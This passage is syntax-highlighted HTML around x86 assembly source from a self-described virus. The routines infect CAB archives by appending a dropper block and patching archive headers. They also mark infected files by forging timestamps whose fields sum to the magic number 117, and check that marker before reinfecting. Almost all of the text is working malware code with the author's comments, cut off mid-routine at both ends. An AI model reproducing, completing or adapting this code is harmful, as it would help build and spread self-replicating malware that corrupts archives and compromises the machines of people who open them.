            </span><span class="sc4">(</span><span class="sc5">CABh_nFiles</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_h_struct</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc0"> \
            </span><span class="sc4">(</span><span class="sc5">CABh_FirstRec</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_h_struct</span><span class="sc4">),</span><span class="sc0"> \
            </span><span class="sc5">CAB_file_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_directory_start</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_dFSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_nChars</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">CAB_entry</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_file_start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc5">.</span><span class="sc0"> \
            </span><span class="sc4">(</span><span class="sc5">CABh_FileSize</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_h_struct</span><span class="sc4">),</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; change folder's values</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_myFolder</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fFSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">CAB_entry</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_directory_start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0">  </span><span class="sc4">(</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_nChars</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;offset to the 1st entry</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">0001h</span><span class="sc0">  </span><span class="sc1">;number of blocks</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">  </span><span class="sc1">;type of compress</span><span class="sc0">

        </span><span class="sc1">; create new block and copy dropper</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fMemory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fFSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,(</span><span class="sc5">CAB_entry</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_directory_start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_nChars</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CAB_entry</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;create new block</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">CABe_Compr_data</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">CAB_entry</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;copy my dropper</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_dFSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_dHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyReadFile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__iCAB_dClose</span><span class="sc0">

        </span><span class="sc1">; "update" headers + whole file + dropper</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fMemory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyWriteFile</span><span class="sc0">

        </span><span class="sc1">; archive has been infected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__set_archive_infected</span><span class="sc0">

    </span><span class="sc5">__iCAB_dClose</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fMemory</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mdealloc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_dHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyCloseFile</span><span class="sc0">
    </span><span class="sc5">__iCAB_fClose</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__iCAB_fHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__MyCloseFile</span><span class="sc0">

    </span><span class="sc5">__iCAB_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ common archivez operations ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;Check whether archive  has been  infected. This  function</span><span class="sc0">
        </span><span class="sc1">;reads  its time and  calculate whether  isn't divided  by</span><span class="sc0">
        </span><span class="sc1">;magic number (for this virus it is 117).</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  input:</span><span class="sc0">
        </span><span class="sc1">;        EBX ... file handle</span><span class="sc0">
        </span><span class="sc1">;  output:</span><span class="sc0">
        </span><span class="sc1">;        CFlags</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">__get_archive_infected</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; get archive file time</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileTime</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;LastWriteTime</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;LastAccessTime</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;CreationTime</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;file handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddGetFileTime</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__gai_failed</span><span class="sc0">

        </span><span class="sc1">; convert "FileTime" to "SystemTime"</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SystemTime</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;SystemTime structure</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileTime</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;FileTime structure</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddFileTimeToSystemTime</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; hours, minutes, seconds, milliseconds add up</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SystemTime</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">SystemTime</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc5">__gai_calculate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__gai_calculate</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">1990</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SystemTime.wDayOfWeek</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__check_infected</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">__gai_failed</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0F9h</span><span class="sc0">         </span><span class="sc1">;hidden STC instruction</span><span class="sc0">
    </span><span class="sc5">__gai_failed</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function set 117 value among Year, Month, Day, Hour,</span><span class="sc0">
        </span><span class="sc1">;Minute and Second value  by FileTime. At first I will put</span><span class="sc0">
        </span><span class="sc1">;random values there and then I will modify it once again.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;  input:</span><span class="sc0">
        </span><span class="sc1">;        EBX ... file handle</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc1">; TimeBuffer:</span><span class="sc0">
        </span><span class="sc1">;       1st value = offset in SystemTime struct</span><span class="sc0">
        </span><span class="sc1">;       2nd value = max of generate number</span><span class="sc0">
        </span><span class="sc1">;       3rd value = increase generate number</span><span class="sc0">
        </span><span class="sc5">__sai_TimeBuffer</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc2">30</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc2">8</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                 </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">60</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc4">,</span><span class="sc2">60</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">__sai_counter</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">__set_archive_infected</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc1">; divide that number to Year, Month, Day, Hour, Minute...</span><span class="sc0">
    </span><span class="sc5">__sai_restart</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__sai_TimeBuffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SystemTime</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">117</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc5">__sai_again</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;offset in SystemTime struct</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc1">;generate number</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__sai_loop</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">__sai_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">*</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__sai_again</span><span class="sc0">

        </span><span class="sc1">; only even seconds</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SystemTime</span><span class="sc4">]</span><span class="sc5">.wSecond</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__sai_restart</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">80000000h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__sai_restart</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__sai_continue</span><span class="sc0">

        </span><span class="sc1">; increase/decrease some value from SystemTime</span><span class="sc0">
    </span><span class="sc5">__sai_next_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__sai_TimeBuffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SystemTime</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">__sai_new_value</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__sai_counter</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">;disable Year</span><span class="sc0">
    </span><span class="sc5">__sai_next_value</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">;start of scaning</span><span class="sc0">
    </span><span class="sc5">__sai_next_round</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">               </span><span class="sc1">;disable Year or</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;next value</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__sai_counter</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;the right value</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__sai_next_round</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">              </span><span class="sc1">;'ceuse of gen. n.</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__sai_fulled</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;increase value</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;decrease counter</span><span class="sc0">

    </span><span class="sc5">__sai_fulled</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">;finish ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__sai_continue</span><span class="sc0">
    </span><span class="sc5">__sai_disable_value</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__sai_counter</span><span class="sc4">],</span><span class="sc2">00000002h</span><span class="sc0">   </span><span class="sc1">;next value in ST</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__sai_counter</span><span class="sc4">],</span><span class="sc2">00000004h</span><span class="sc0">   </span><span class="sc1">;"Day Of Week" value?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__sai_disable_value</span><span class="sc0">     </span><span class="sc1">;if yes, disable it</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__sai_counter</span><span class="sc4">],</span><span class="sc2">0000000Ch</span><span class="sc0">   </span><span class="sc1">;"Second" value ?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__sai_disable_value</span><span class="sc0">     </span><span class="sc1">;if yes, disable it</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__sai_counter</span><span class="sc4">],</span><span class="sc2">7</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc0">     </span><span class="sc1">;end of table ?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__sai_next_value</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__sai_new_value</span><span class="sc0">

    </span><span class="sc5">__sai_continue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SystemTime</span><span class="sc4">]</span><span class="sc5">.wMilliseconds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SystemTime</span><span class="sc4">]</span><span class="sc5">.wYear</span><span class="sc4">,</span><span class="sc2">1990</span><span class="sc0">

        </span><span class="sc1">; convert "SystemTime" to "FileTime"</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileTime</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;FileTime structure</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SystemTime</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;SystemTime structure</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddSystemTimeToFileTime</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; set FileTime</span><span class="sc0">
